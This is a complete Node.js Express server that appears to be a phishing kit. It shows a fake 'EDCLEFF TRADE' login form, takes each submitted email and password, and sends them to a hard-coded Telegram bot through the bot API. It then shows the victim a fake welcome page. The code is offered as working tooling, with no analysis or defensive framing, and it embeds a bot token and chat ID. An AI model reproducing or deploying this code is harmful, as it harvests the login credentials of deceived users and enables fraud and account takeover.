const express = require('express');
const https = require('https');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));

const BOT_TOKEN = '8776500357:AAF_8kD26cKyjulIiida3tULY7ZjdrJBryw';
const CHAT_ID = '7623047017';

console.log('🔥 TELEGRAM BOT ACTIVE');

app.get('/', (req, res) => {
  res.send(`<h1>EDCLEFF TRADE</h1>
<form action="/login" method="POST">
<input type="email" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">LOGIN</button>
</form>`);
});

app.post('/login', (req, res) => {
  const { email, password } = req.body;
  console.log('📨 LOGIN:', email, password);
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🔐%20EDCLEFF%20LOGIN%0AEmail:%20${email}%0APassword:%20${password}`;
  https.get(url);
  res.send(`<h2>Welcome ${email}!</h2><a href="/">Logout</a>`);
});

app.listen(PORT, () => console.log('✅ Server on', PORT));
